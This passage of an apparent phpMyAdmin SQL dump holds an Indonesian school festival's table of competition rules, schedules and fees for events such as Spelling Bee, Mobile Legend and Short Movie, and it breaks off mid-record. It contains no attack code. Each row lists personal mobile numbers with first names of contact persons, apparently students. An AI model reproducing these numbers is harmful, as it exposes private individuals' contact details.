-- phpMyAdmin SQL Dump
-- version 4.9.4
-- https://www.phpmyadmin.net/
--
-- Host: localhost:3306
-- Waktu pembuatan: 15 Mar 2020 pada 12.23
-- Versi server: 5.7.28
-- Versi PHP: 7.3.6

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET AUTOCOMMIT = 0;
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `telsfest_ival`
--

-- --------------------------------------------------------

--
-- Struktur dari tabel `bidang_lomba`
--

CREATE TABLE `bidang_lomba` (
  `id_bidang_lomba` int(11) NOT NULL,
  `nama_lomba` text NOT NULL,
  `logo_lomba` text NOT NULL,
  `juknis` text NOT NULL,
  `syarat` text NOT NULL,
  `link_stream` text,
  `link_bagan` text,
  `min_total_pemain` int(11) NOT NULL,
  `total_pemain` int(11) NOT NULL,
  `max` int(11) NOT NULL,
  `biaya_pendaftaran` int(11) NOT NULL,
  `cp_1` text NOT NULL,
  `cp_2` text NOT NULL,
  `tm` text NOT NULL,
  `lomba` text NOT NULL,
  `pendaftaran` text NOT NULL,
  `akhir_daftar` date NOT NULL
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

--
-- Dumping data untuk tabel `bidang_lomba`
--

INSERT INTO `bidang_lomba` (`id_bidang_lomba`, `nama_lomba`, `logo_lomba`, `juknis`, `syarat`, `link_stream`, `link_bagan`, `min_total_pemain`, `total_pemain`, `max`, `biaya_pendaftaran`, `cp_1`, `cp_2`, `tm`, `lomba`, `pendaftaran`, `akhir_daftar`) VALUES
(1, 'Story Telling', '1567186710.png', '<p><strong>PENDAFTARAN LOMBA :</strong></p>\r\n\r\n<ul>\r\n <li>\r\n  <p>2 September 2019 &ndash; 11 November 2019</p>\r\n  </li>\r\n</ul>\r\n\r\n<p><strong>HARI &amp; TANGGAL PELAKSANAAN LOMBA&nbsp;:</strong></p>\r\n\r\n<ul>\r\n <li>Sabtu, 16 November 2019</li>\r\n</ul>\r\n\r\n<p><strong>TECHNICAL MEETING :</strong></p>\r\n\r\n<ul>\r\n  <li>Kamis, 14 November 2019</li>\r\n</ul>\r\n\r\n<p><strong>WAKTU TECHNICAL MEETING&nbsp;:</strong></p>\r\n\r\n<ul>\r\n <li>10.00 &ndash; selesai</li>\r\n</ul>\r\n\r\n<p><strong>TEMPAT TECHNICAL MEETING DAN LOMBA :</strong></p>\r\n\r\n<ul>\r\n <li>SMK Telekomunikasi Telesandi Bekasi</li>\r\n</ul>', '<ol>\r\n	<li>Peserta lomba adalah siswa/i SMP/MTS sederajat</li>\r\n	<li>Karena ini merupakan lomba yang bersifat individu, maka setiap sekolah di batasi maksimal 3&nbsp;orang untuk mengikuti lomba Story Telling.</li>\r\n	<li>&nbsp;Mengisi formulir pendaftaran langsung di sekolah ataupun melalui website setelah melakukan pembayaran saat pendaftaran melalui panitia lomba.</li>\r\n	<li>Tempat lomba akan dilaksanakan di SMK Telekomunikasi Telesandi Bekasi.</li>\r\n	<li>Peserta wajib menyerahkan foto ukuran 3x4 (dua&nbsp;lembar), fotocopy lembar biodata rapot (satu&nbsp;lembar), surat keterangan dari sekolah dan fotocopy kartu pelajaran (satu&nbsp;lembar).</li>\r\n	<li>Siapkan 2 naskah cerita dan difotocopy masing-masing sebanyak 3 rangkap. untuk diserahkan kepada panitia</li>\r\n	<li>Naskah cerita yang akan ditampilkan harus diserahkan ke panitia selambat-lambatnya pada saat technical meeting.</li>\r\n	<li>Tema cerita berkaitan tentang legenda ( Cerita Rakyat ).</li>\r\n	<li>Keputusan juri bersifat mutlak dan tidak dapat diganggu gugat</li>\r\n	<li>Selama perlombaan berlangsung, peserta harus berpakaian rapi, sopan, serta menjaga kebersihan dan ketertiban.</li>\r\n	<li>Petunjuk pelaksanaan dan petunjuk teknis akan dibahas lebih lanjut saat technical meeting.</li>\r\n</ol>', NULL, '', 1, 1, 3, 75000, '089647124357 (Dwi)', '085711717232 (Indah)', '<ul>\r\n	<li>\r\n	<p><strong>HARI &amp; TANGGAL :</strong></p>\r\n\r\n	<ul>\r\n		<li>Kamis, 14 November 2019</li>\r\n	</ul>\r\n	</li>\r\n	<li>\r\n	<p><strong>WAKTU :</strong></p>\r\n\r\n	<ul>\r\n		<li>09.00 &ndash; selesai</li>\r\n	</ul>\r\n	</li>\r\n	<li>\r\n	<p><strong>TEMPAT :</strong></p>\r\n\r\n	<ul>\r\n		<li>AULA SMK Telekomunikasi Telesandi Bekasi</li>\r\n	</ul>\r\n	</li>\r\n</ul>', '<ul>\r\n	<li>\r\n	<p><strong>HARI &amp; TANGGAL :</strong></p>\r\n\r\n	<ul>\r\n		<li>Sabtu, 16 November 2019</li>\r\n	</ul>\r\n	</li>\r\n	<li>\r\n	<p><strong>WAKTU :</strong></p>\r\n\r\n	<ul>\r\n		<li>08.00 &ndash; 17.00 WIB</li>\r\n	</ul>\r\n	</li>\r\n	<li>\r\n	<p><strong>TEMPAT :</strong></p>\r\n\r\n	<ul>\r\n		<li>Ruang Kelas SMK Telekomunikasi Telesandi Bekasi</li>\r\n	</ul>\r\n	</li>\r\n</ul>', '<ul>\r\n	<li>2 September 2019 &ndash; 11 November 2019</li>\r\n</ul>', '2019-11-11'),
(2, 'Spelling Bee', '1567187090.png', '<p><strong>PENDAFTARAN :</strong></p>\r\n\r\n<ul>\r\n  <li>\r\n  <p>2 September &ndash; 11 November 2019</p>\r\n </li>\r\n</ul>\r\n\r\n<p><strong>HARI &amp; TANGGAL PELAKSANAAN&nbsp;:</strong></p>\r\n\r\n<ul>\r\n <li>Sabtu, 16 November 2019</li>\r\n</ul>\r\n\r\n<p><strong>TECHNICAL MEETING :</strong></p>\r\n\r\n<ul>\r\n  <li>Kamis, 14 November 2019</li>\r\n</ul>\r\n\r\n<p><strong>WAKTU PELAKSANAAN&nbsp;:</strong></p>\r\n\r\n<ul>\r\n <li>10.00 &ndash; selesai</li>\r\n</ul>\r\n\r\n<p><strong>TEMPAT :</strong></p>\r\n\r\n<ul>\r\n <li>SMK Telekomunikasi Telesandi Bekasi</li>\r\n</ul>', '<p>&nbsp;</p>\r\n\r\n<ol>\r\n  <li>Lomba bersifat Individual.</li>\r\n <li>Perlombaan terbuka bagi siswa/i SMP/MTS Sederajat.</li>\r\n <li>mengisi formulir pendaftaran langsung di sekolah ataupun melalui website setelah melakukan pembayaran saat pendaftaran melalui panitia lomba, kemudian diberikan kepada panitia saat technical meeting sebagai bukti bahwa peserta terdaftar dalam lomba.</li>\r\n  <li>Peserta mengumpulkan berkas-berkas untuk pendataan peserta saat technical meeting atau selambat-lambatnya H-7 sebelum lomba diadakan. Pada saat technical meeting diwajibkan membawa :\r\n  <ul>\r\n    <li>a). Surat rekomendasi dari Kepala Sekolah.</li>\r\n   <li>b). Formulir pendaftaran.</li>\r\n    <li>c). Pas foto berwarna ukuran 3&times;4 (2 lembar)/peserta.</li>\r\n   <li>d). Foto copy Kartu Pelajar (2 lembar)/peserta bolak-balik.</li>\r\n  </ul>\r\n </li>\r\n <li>Peserta wajib melakukan registrasi ulang pada hari-H selambat lambatnya 2 jam sebelum pelaksanaan lomba dimulai.</li>\r\n <li>Peserta yang telah melakukan registrasi ulang dan mendapat nomor urut harus bersiap di tempat yang telah ditentukan. Harap melakukan konfirmasi jika terjadi keterlambatan minimal 2 jam sebelum lomba dimulai.</li>\r\n  <li>Peserta lomba wajib menggunakan identitas yang telah diberikan oleh panitia.</li>\r\n <li>Jika peserta tidak hadir saat lomba, maka dianggap mengundurkan diri.</li>\r\n  <li>Pemenang terdiri dari juara I, juara II, dan juara III.</li>\r\n  <li>Penjurian dilakukan oleh 1 juri dan 1 pronuncer.</li>\r\n <li>Keputusan juri bersifat mutlak dan tidak dapat diganggu gugat.</li>\r\n <li>Petunjuk teknis mengenai pelaksanaan lomba akan dibahas lebih lanjut saat technical meeting.</li>\r\n <li>Setiap sekolah maksimal mengirimkan 3 peserta.</li>\r\n</ol>', '', '', 1, 1, 3, 75000, '082114182621 (Tanti)', '081299601026 (Chika)', '<ul>\r\n  <li>\r\n  <p><strong>HARI &amp; TANGGAL :</strong></p>\r\n\r\n  <ul>\r\n    <li>Kamis, 14 November 2019</li>\r\n  </ul>\r\n </li>\r\n <li>\r\n  <p><strong>WAKTU :</strong></p>\r\n\r\n <ul>\r\n    <li>09.00 &ndash; selesai</li>\r\n  </ul>\r\n </li>\r\n <li>\r\n  <p><strong>TEMPAT :</strong></p>\r\n\r\n  <ul>\r\n    <li>AULA SMK Telekomunikasi Telesandi Bekasi</li>\r\n </ul>\r\n </li>\r\n</ul>', '<ul>\r\n  <li>\r\n  <p><strong>HARI &amp; TANGGAL :</strong></p>\r\n\r\n  <ul>\r\n    <li>Sabtu, 16 November 2019</li>\r\n  </ul>\r\n </li>\r\n <li>\r\n  <p><strong>WAKTU :</strong></p>\r\n\r\n <ul>\r\n    <li>08.00 &ndash; 17.00 WIB</li>\r\n  </ul>\r\n </li>\r\n <li>\r\n  <p><strong>TEMPAT :</strong></p>\r\n\r\n  <ul>\r\n    <li>Lab SMK Telekomunikasi Telesandi Bekasi</li>\r\n  </ul>\r\n </li>\r\n</ul>', '<ul>\r\n  <li>2 September 2019 &ndash; 11 November 2019</li>\r\n</ul>', '2019-11-11'),
(3, 'Auto Chess', '1567216679.png', '<p><strong>PENDAFTARAN :</strong></p>\r\n\r\n<ul>\r\n  <li>\r\n  <p>2 September &ndash; 28 Oktober 2019</p>\r\n  </li>\r\n</ul>\r\n\r\n<p><strong>TANGGAL PELAKSANAAN&nbsp;:</strong></p>\r\n\r\n<ul>\r\n  <li>2 November 2019 &ndash; 16 November 2019</li>\r\n</ul>\r\n\r\n<p><strong>TECHNICAL MEETING :</strong></p>\r\n\r\n<ul>\r\n <li>Kamis, 31 Oktober 2019</li>\r\n</ul>\r\n\r\n<p><strong>WAKTU&nbsp;:</strong></p>\r\n\r\n<ul>\r\n  <li>10.00 &ndash; selesai</li>\r\n</ul>\r\n\r\n<p><strong>TEMPAT :</strong></p>\r\n\r\n<ul>\r\n <li>SMK Telekomunikasi Telesandi Bekasi</li>\r\n</ul>', '<ol>\r\n	<li>Perlombaan terbuka untuk pelajar.</li>\r\n	<li>Lomba terbuka untuk pelajar umum.</li>\r\n	<li>Pertandingan terdiri dari 2 babak :\r\n	<ul>\r\n		<li>Babak Penyisihan : Terdiri dari 2 Group masing-masing 8 peserta</li>\r\n		<li>Babak Final : Terdiri dari 2 Group masing-masing 4 peserta</li>\r\n	</ul>\r\n	</li>\r\n	<li>Ada babak penyisihan, 4 Pemenang dari masing-masing group akan masuk ke babak final</li>\r\n	<li>Pada babak final, Akan ditentukan Pemenang Lomba.</li>\r\n	<li>Dilarang menggunakan kata-kata kasar pada saat perlombaan berlangsung.</li>\r\n	<li>Peserta harus menggunakan akun asli milik sendiri untuk mengikuti pertandingan.</li>\r\n	<li>Nickname tidak boleh mengandung unsur SARA, PORNOGRAFI, dan POLITIK</li>\r\n	<li>Peserta di berikan waktu 15 menit untuk masuk room pertandingan, Jika dalam waktu yang sudah ditentukan peserta tidak ada di dalam room maka peserta akan di diskualifikasi.</li>\r\n	<li>Petunjuk pelaksanaan dan petunjuk teknis akan dibahas pada saat technical meeting</li>\r\n</ol>', '', '', 1, 1, 1, 50000, '087874385891 (Zarif)', '081381342323 (Rafli)', '<ul>\r\n	<li>\r\n	<p><strong>HARI &amp; TANGGAL :</strong></p>\r\n\r\n	<ul>\r\n		<li>Kamis, 31 Oktober 2019</li>\r\n	</ul>\r\n	</li>\r\n	<li>\r\n	<p><strong>WAKTU :</strong></p>\r\n\r\n	<ul>\r\n		<li>10.00 &ndash; selesai</li>\r\n	</ul>\r\n	</li>\r\n	<li>\r\n	<p><strong>TEMPAT :</strong></p>\r\n\r\n	<ul>\r\n		<li>AULA SMK Telekomunikasi Telesandi Bekasi</li>\r\n	</ul>\r\n	</li>\r\n</ul>', '<ul>\r\n	<li>\r\n	<p><strong>TANGGAL :</strong></p>\r\n\r\n	<ul>\r\n		<li>2 November 2019 &ndash; 16 November 2019</li>\r\n	</ul>\r\n	</li>\r\n	<li>\r\n	<p><strong>WAKTU :</strong></p>\r\n\r\n	<ul>\r\n		<li>08.00 &ndash; 17.00 WIB</li>\r\n	</ul>\r\n	</li>\r\n	<li>\r\n	<p><strong>TEMPAT :</strong></p>\r\n\r\n	<ul>\r\n		<li>Lab SMK Telekomunikasi Telesandi Bekasi</li>\r\n	</ul>\r\n	</li>\r\n</ul>', '<ul>\r\n	<li>2 September 2019 &ndash; 28 Oktober 2019</li>\r\n</ul>', '2019-10-30'),
(4, 'Mobile Legend', '1567217076.png', '<p><strong>PENDAFTARAN :</strong></p>\r\n\r\n<ul>\r\n <li>\r\n  <p>2 September 2019 - 28 Oktober 2019</p>\r\n </li>\r\n</ul>\r\n\r\n<p><strong>TANGGAL PELAKSANAAN&nbsp;:</strong></p>\r\n\r\n<ul>\r\n  <li>2 November 2019 &ndash; 16 November 2019</li>\r\n</ul>\r\n\r\n<p><strong>TECHNICAL MEETING :</strong></p>\r\n\r\n<ul>\r\n <li>Kamis, 31 Oktober 2019</li>\r\n</ul>\r\n\r\n<p><strong>WAKTU&nbsp;:</strong></p>\r\n\r\n<ul>\r\n  <li>10.00 &ndash; selesai</li>\r\n</ul>\r\n\r\n<p><strong>TEMPAT :</strong></p>\r\n\r\n<ul>\r\n <li>SMK Telekomunikasi Telesandi Bekasi</li>\r\n</ul>', '<ol>\r\n	<li>Perlombaan terbuka untuk pelajar.</li>\r\n	<li>Sistem Pertandingan Menggunakan Custom Mode Draft Pick, 5 vs 5 Match Up Battle.</li>\r\n	<li>Satu tim terdiri dari 5 pemain dan 1 cadangan.</li>\r\n	<li>Sistem Pertandingan akan menggunakan sistem eliminasi, Satu pertandingan menentukan Anda menang atau kalah.</li>\r\n	<li>Tidak menggunakan aplikasi lain/ aplikasi ke 3/ Emulator, dan cheat.</li>\r\n	<li>Nickname tidak boleh mengandung unsur SARA, PORNOGRAFI, dan POLITIK.</li>\r\n	<li>Babak Kuarter-Final dan Semi-Final akan menggunakan sistem Best-of-Three, dan Babak Final akan menggunakan sistem Best-of-Five. Setiap pertandingan akan disiarkan secara langsung di Platform Official.</li>\r\n	<li>Peserta diharus menggunakan akun asli milik sendiri untuk mengikuti pertandingan.</li>\r\n	<li>Tidak ada larangan untuk Level Akun, Hero dan Skin yang digunakan.</li>\r\n	<li>Dilarang Berkata kasar selama pertandingan berlangsung.</li>\r\n	<li>Peserta di berikan waktu 15 menit untuk masuk room pertandingan, Jika dalam waktu yang sudah ditentukan peserta tidak ada di dalam room maka peserta akan di diskualifikasi.</li>\r\n	<li>Petunjuk pelaksanaan dan petunjuk teknis akan dibahas pada saat technical meeting</li>\r\n</ol>', '', '', 5, 5, 1, 100000, '085884319546 (Suyuful)', '082260408145 (Dava)', '<ul>\r\n	<li>\r\n	<p><strong>HARI &amp; TANGGAL :</strong></p>\r\n\r\n	<ul>\r\n		<li>Kamis, 31 Oktober 2019</li>\r\n	</ul>\r\n	</li>\r\n	<li>\r\n	<p><strong>WAKTU :</strong></p>\r\n\r\n	<ul>\r\n		<li>16.00 &ndash; selesai</li>\r\n	</ul>\r\n	</li>\r\n	<li>\r\n	<p><strong>TEMPAT :</strong></p>\r\n\r\n	<ul>\r\n		<li>AULA SMK Telekomunikasi Telesandi Bekasi</li>\r\n	</ul>\r\n	</li>\r\n</ul>', '<ul>\r\n	<li>\r\n	<p><strong>TANGGAL :</strong></p>\r\n\r\n	<ul>\r\n		<li>9 November 2019 &ndash; 16 November 2019</li>\r\n	</ul>\r\n	</li>\r\n	<li>\r\n	<p><strong>WAKTU :</strong></p>\r\n\r\n	<ul>\r\n		<li>08.00 &ndash; 17.00 WIB</li>\r\n	</ul>\r\n	</li>\r\n	<li>\r\n	<p><strong>TEMPAT :</strong></p>\r\n\r\n	<ul>\r\n		<li>Lab SMK Telekomunikasi Telesandi Bekasi</li>\r\n	</ul>\r\n	</li>\r\n</ul>', '<ul>\r\n	<li>2 September 2019 &ndash; 28 Oktober 2019</li>\r\n</ul>', '2019-10-30'),
(5, 'Free Fire', '1567217543.png', '<p><strong>PENDAFTARAN :</strong></p>\r\n\r\n<ul>\r\n <li>\r\n  <p>2 September &ndash; 28 Oktober 2019</p>\r\n  </li>\r\n</ul>\r\n\r\n<p><strong>HARI &amp; TANGGAL PELAKSANAAN&nbsp;:</strong></p>\r\n\r\n<ul>\r\n <li>Sabtu, 16 November 2019</li>\r\n</ul>\r\n\r\n<p><strong>TECHNICAL MEETING :</strong></p>\r\n\r\n<ul>\r\n  <li>Kamis, 31 Oktober 2019</li>\r\n</ul>\r\n\r\n<p><strong>WAKTU&nbsp;:</strong></p>\r\n\r\n<ul>\r\n  <li>10.00 &ndash; selesai</li>\r\n</ul>\r\n\r\n<p><strong>TEMPAT :</strong></p>\r\n\r\n<ul>\r\n <li>SMK Telekomunikasi Telesandi Bekasi</li>\r\n</ul>', '<ol>\r\n	<li>Perlombaan terbuka untuk pelajar.</li>\r\n	<li>Sistem Pertandingan Menggunakan Custom Mode.</li>\r\n	<li>Setiap tim terdiri dari 4 pemain dan 1 cadangan.</li>\r\n	<li>Sistem Pertandingan akan menggunakan sistem eliminasi, Satu pertandingan menentukan Anda menang atau kalah.</li>\r\n	<li>Peserta diharus menggunakan akun asli milik sendiri untuk mengikuti pertandingan.</li>\r\n	<li>Nickname tidak menggunakan unsur SARA dan PORNOGRAFI.</li>\r\n	<li>Tidak boleh memakai EMULATOR atau Aplikasi Tambahan dan Cheat.</li>\r\n	<li>Sistem permainan akan dijelaskan pada saat technical meeting.</li>\r\n	<li>Petunjuk pelaksanaan dan petunjuk teknis akan dibahas pada saat technical meeting.</li>\r\n</ol>', '', '', 5, 5, 1, 100000, '082249705543 (Dendi)', '081911006565 (Ahnaf)', '<ul>\r\n	<li>\r\n	<p><strong>HARI &amp; TANGGAL :</strong></p>\r\n\r\n	<ul>\r\n		<li>Kamis, 31 Oktober 2019</li>\r\n	</ul>\r\n	</li>\r\n	<li>\r\n	<p><strong>WAKTU :</strong></p>\r\n\r\n	<ul>\r\n		<li>16.00 &ndash; selesai</li>\r\n	</ul>\r\n	</li>\r\n	<li>\r\n	<p><strong>TEMPAT :</strong></p>\r\n\r\n	<ul>\r\n		<li>AULA SMK Telekomunikasi Telesandi Bekasi</li>\r\n	</ul>\r\n	</li>\r\n</ul>', '<ul>\r\n	<li>\r\n	<p><strong>TANGGAL :</strong></p>\r\n\r\n	<ul>\r\n		<li>3 November 2019 &ndash; 16 November 2019</li>\r\n	</ul>\r\n	</li>\r\n	<li>\r\n	<p><strong>WAKTU :</strong></p>\r\n\r\n	<ul>\r\n		<li>08.00 &ndash; 17.00 WIB</li>\r\n	</ul>\r\n	</li>\r\n	<li>\r\n	<p><strong>TEMPAT :</strong></p>\r\n\r\n	<ul>\r\n		<li>Lab SMK Telekomunikasi Telesandi Bekasi</li>\r\n	</ul>\r\n	</li>\r\n</ul>', '<ul>\r\n	<li>2 September 2019 &ndash; 28 Oktober 2019</li>\r\n</ul>', '2019-10-30'),
(6, 'Rally Photo', '1567217859.png', '<p><strong>PENDAFTARAN :</strong></p>\r\n\r\n<ul>\r\n <li>\r\n  <p>2 September &ndash; 11 November 2019</p>\r\n </li>\r\n</ul>\r\n\r\n<p><strong>HARI &amp; TANGGAL PELAKSANAAN&nbsp;:</strong></p>\r\n\r\n<ul>\r\n <li>Sabtu, 16 November 2019</li>\r\n</ul>\r\n\r\n<p><strong>TECHNICAL MEETING :</strong></p>\r\n\r\n<ul>\r\n  <li>Kamis, 14 November 2019</li>\r\n</ul>\r\n\r\n<p><strong>WAKTU&nbsp;:</strong></p>\r\n\r\n<ul>\r\n <li>10.00 &ndash; selesai</li>\r\n</ul>\r\n\r\n<p><strong>TEMPAT :</strong></p>\r\n\r\n<ul>\r\n <li>SMK Telekomunikasi Telesandi Bekasi</li>\r\n</ul>', '<ol>\r\n	<li>Perlombaan terbuka untuk pelajar.</li>\r\n	<li>Foto diambil saat perlombaan berlangsung.</li>\r\n	<li>Foto tidak boleh mengandung unsur sara, pornografi, dan kekerasan</li>\r\n	<li>Setting tanggal kamera, tanggal lomba berlangsung dan membuat folder baru pada kamera/format foto JPEG/JPG.</li>\r\n	<li>Peserta tidak diperboleh menggunakan kamera Smartphone, Drone dan Action cam.</li>\r\n	<li>Peserta hanya diperboleh menggunakan kamera (DSLR Mirorless, Pocket, dan sejenisnya).</li>\r\n	<li>Peserta akan diberikan 3 tema yang akan diberikan panitia, 1 tema akan diberikan waktu selama 1 jam untuk proses pemotretan.</li>\r\n	<li>Peserta hanya diperboleh mengedit sebatas contrast, cropping dan brightness.</li>\r\n	<li>Kriteria penilaian foto adalah Angle, Komposisi, Originalitas, Moment.</li>\r\n	<li>Apabila terdapat kecurangan, akan di diskualifikasi.</li>\r\n	<li>Memakai seragam sekolah pada saat perlomba berlangsung.</li>\r\n	<li>Peserta wajib mematuhi peraturan yang ada.</li>\r\n	<li>Keputusan yang diambil oleh panitia dan juri bersifat mutlak, tidak dapat diganggu gugat.</li>\r\n	<li>Petunjuk pelaksanaan dan petunjuk teknis akan dibahas pada saat technical meeting.</li>\r\n</ol>', '', '', 1, 1, 1, 75000, '0895357367852 (Sasya)', '085212148778 (Garcia)', '<ul>\r\n	<li>\r\n	<p><strong>HARI &amp; TANGGAL :</strong></p>\r\n\r\n	<ul>\r\n		<li>Kamis, 14 November 2019</li>\r\n	</ul>\r\n	</li>\r\n	<li>\r\n	<p><strong>WAKTU :</strong></p>\r\n\r\n	<ul>\r\n		<li>12.00 &ndash; selesai</li>\r\n	</ul>\r\n	</li>\r\n	<li>\r\n	<p><strong>TEMPAT :</strong></p>\r\n\r\n	<ul>\r\n		<li>AULA SMK Telekomunikasi Telesandi Bekasi</li>\r\n	</ul>\r\n	</li>\r\n</ul>', '<ul>\r\n	<li>\r\n	<p><strong>TANGGAL :</strong></p>\r\n\r\n	<ul>\r\n		<li>Sabtu, 16 November 2019</li>\r\n	</ul>\r\n	</li>\r\n	<li>\r\n	<p><strong>WAKTU :</strong></p>\r\n\r\n	<ul>\r\n		<li>08.00 &ndash; 17.00 WIB</li>\r\n	</ul>\r\n	</li>\r\n	<li>\r\n	<p><strong>TEMPAT :</strong></p>\r\n\r\n	<ul>\r\n		<li>Downtown SMK Telekomunikasi Telesandi Bekasi</li>\r\n	</ul>\r\n	</li>\r\n</ul>', '<ul>\r\n	<li>2 September 2019 &ndash; 11 November 2019</li>\r\n</ul>', '2019-11-11'),
(7, 'Short Movie', '1567218905.png', '<p><strong>PENDAFTARAN :</strong></p>\r\n\r\n<ul>\r\n <li>\r\n  <p>2 September 2019 &ndash; 7 November 2019</p>\r\n </li>\r\n</ul>\r\n\r\n<p><strong>HARI &amp; TANGGAL PELAKSANAAN :</strong></p>\r\n\r\n<ul>\r\n  <li>Sabtu, 16 November 2019</li>\r\n</ul>\r\n\r\n<p><strong>TECHNICAL MEETING :</strong></p>\r\n\r\n<ul>\r\n  <li>Sabtu, 26 Oktober 2019</li>\r\n</ul>\r\n\r\n<p><strong>WAKTU :</strong></p>\r\n\r\n<ul>\r\n <li>10.00 &ndash; selesai</li>\r\n</ul>\r\n\r\n<p><strong>TEMPAT :</strong></p>\r\n\r\n<ul>\r\n <li>SMK Telekomunikasi Telesandi Bekasi</li>\r\n</ul>', '<ol>\r\n	<li>Perlombaan terbuka untuk SMP/MTS dan SMA/K sederajat.</li>\r\n	<li>Setiap sekolah maksimal mengirimkan 2 tim.</li>\r\n	<li>Satu tim maksimal terdiri dari 10 peserta termasuk kru dan pemeran.</li>\r\n	<li>Peserta wajib menyerahkan :\r\n	<ul>\r\n		<li>a. Pas foto ukuran 3x4 (2) dua lembar untuk : - background foto SMP/Mts (Biru) - background foto SMA/K (Merah)</li>\r\n		<li>b. Surat keterangan dari Sekolah</li>\r\n		<li>c. Fotocopy kartu pelajar (2) dua lembar</li>\r\n	</ul>\r\n	</li>\r\n	<li>Untuk Minimal durasi Video short movie adalah 4 menit dan maksimal adalah 7 menit (sudah termasuk credit title).</li>\r\n	<li>Minimal resolusi Video adalah 1280x720 pixel (HD) dan maksimal adalah resolusi 1920x1080 pixel (Full HD)</li>\r\n	<li>Tema short movie adalah &quot;Tanpa Tanda Jasa&quot; dan Genre dibebaskan.</li>\r\n	<li>Disarankan ada pesan moral atau makna dalam short movie tersebut.</li>\r\n	<li>Wajib menambahkan watermark Telesandi Cup disepanjang short movie</li>\r\n	<li>Untuk pengumpulan short movie dilakukan H-2 sebelum pelaksanaan.</li>\r\n	<li>Penyerahan file video dikumpulkan melalui flashdisk atau harddisk.</li>\r\n	<li>Jika menggunakan elemen ber-hak cipta (backsound, dan lain-lain) di sertakan pada credit film.</li>\r\n	<li>Peserta hanya diperbolehkan menggunakan Kamera(DSLR,Mirrorless,Action Cam) dan Drone pada saat pembuatan vidio.</li>\r\n	<li>Jika menggunakan kalimat atau dialog selain Bahasa Indonesia atau Bahasa Asing atau Daerah diharapkan menyertakan subtitle(terjemahan)</li>\r\n	<li>Tidak boleh mengandung unsur Sara ,Kekerasan, dan Pornografi.</li>\r\n	<li>Keputusan Juri tidak dapat diganggu gugat.</li>\r\n	<li>Petunjuk pelaksanaan dan petunjuk teknis akan dibahas pada saat technical meeting berlangsung.</li>\r\n</ol>', '', '', 7, 10, 1, 100000, '081317252469 (Claudio)', '081293611070 (Diva)', '<ul>\r\n	<li>\r\n	<p><strong>HARI &amp; TANGGAL :</strong></p>\r\n\r\n	<ul>\r\n		<li>Jumat, 1&nbsp;November 2019</li>\r\n	</ul>\r\n	</li>\r\n	<li>\r\n	<p><strong>WAKTU :</strong></p>\r\n\r\n	<ul>\r\n		<li>16.00 &ndash; selesai</li>\r\n	</ul>\r\n	</li>\r\n	<li>\r\n	<p><strong>TEMPAT :</strong></p>\r\n\r\n	<ul>\r\n		<li>AULA SMK Telekomunikasi Telesandi Bekasi</li>\r\n	</ul>\r\n	</li>\r\n</ul>', '<ul>\r\n	<li>\r\n	<p><strong>HARI &amp; TANGGAL :</strong></p>\r\n\r\n	<ul>\r\n		<li>Sabtu, 16 November 2019</li>\r\n	</ul>\r\n	</li>\r\n	<li>\r\n	<p><strong>WAKTU :</strong></p>\r\n\r\n	<ul>\r\n		<li>08.00 &ndash; 17.00 WIB</li>\r\n	</ul>\r\n	</li>\r\n	<li>\r\n	<p><strong>TEMPAT :</strong></p>\r\n\r\n	<ul>\r\n		<li>Ruang Kelas SMK Telekomunikasi Telesandi Bekasi</li>\r\n	</ul>\r\n	</li>\r\n</ul>', '<ul>\r\n	<li>2 September 2019 &ndash; 31&nbsp;Oktober 2019</li>\r\n</ul>', '2019-11-01'),
(8, 'Desain Poster', '1567219158.png', '<p><strong>PENDAFTARAN :</strong></p>\r\n\r\n<ul>\r\n <li>\r\n  <p>2 September 2019 &ndash; 11 November 2019</p>\r\n  </li>\r\n</ul>\r\n\r\n<p><strong>HARI &amp; TANGGAL PELAKSANAAN :</strong></p>\r\n\r\n<ul>\r\n  <li>Sabtu, 16 November 2019</li>\r\n</ul>\r\n\r\n<p><strong>TECHNICAL MEETING :</strong></p>\r\n\r\n<ul>\r\n  <li>Kamis, 14 November 2019</li>\r\n</ul>\r\n\r\n<p><strong>WAKTU :</strong></p>\r\n\r\n<ul>\r\n  <li>10.00 &ndash; selesai</li>\r\n</ul>\r\n\r\n<p><strong>TEMPAT :</strong></p>\r\n\r\n<ul>\r\n <li>SMK Telekomunikasi Telesandi Bekasi</li>\r\n</ul>', '<ol>\r\n <li>Perlombaan terbuka untuk SMP/Mts dan SMA/K sederajat.</li>\r\n  <li>Peserta perlomba terdiri dari 1 orang.</li>\r\n <li>Setiap sekolah diperbolehkan mengirimkan lebih dari 1 peserta</li>\r\n  <li>Peserta yang sudah terdaftar tidak dapat diganti dengan alasan apapun.</li>\r\n</ol>\r\n<p><strong>Ketentuan Lomba</strong></p>\r\n<ol>\r\n <li>Peserta hanya diperbolehkan membawa konsep desain poster saat lomba berlangsung.</li>\r\n <li>Peserta diberi waktu 5 jam untuk mengerjakan poster saat lomba berlangsung.</li>\r\n  <li>\r\n    Terdapat 3 pilihan tema:\r\n    <ul>\r\n      <li>Iklan produk makanan Indonesia.</li>\r\n      <li>Pendidikan Indonesia.</li>\r\n      <li>One Team One Dream One Victory.</li>\r\n    </ul>\r\n </li>\r\n <li>Karya desain disimpan dengan format nama: Desain Poster_Nama Peserta_Asal Sekolah_Tema.</li>\r\n  <li>Karya dibuat menggunakan laptop (digital) dengan\r\n    <ul>\r\n      <li>Format  : psd, cdr, ai</li>\r\n     <li>Resolusi : 300ppi</li>\r\n      <li>Ukuran : A3</li>\r\n    </ul>\r\n </li>\r\n <li>Desain dapat dibuat hanya dengan illustrasi atau menggabungkan antara illusi dengan foto boleh diambil dari internet dan boleh dibuat sendiri (mendapat nilai +).</li>\r\n  <li>Peserta diperbolehkan menggunakan software, coreldraw, adobe photoshop, dan illustrator.</li>\r\n <li>Karya desain tidak boleh mengandung unsur yang bertentangan dengan peraturan perundang-undangan yang berlaku di Indonesia: Kesusilaan, moral, kekerasan dan tidak mengandung unsur pornografi, serta bertentangan dengan SARA.</li>\r\n <li>Karya yang dilombakan merupakan karya asli peserta dan belum pernah diikut sertakan atau dipublikasikan untuk keperluan yang bersifat komersil serta harus bebas dari setiap kontrak atau ikatan lain.</li>\r\n <li>Apabila dikemudian hari 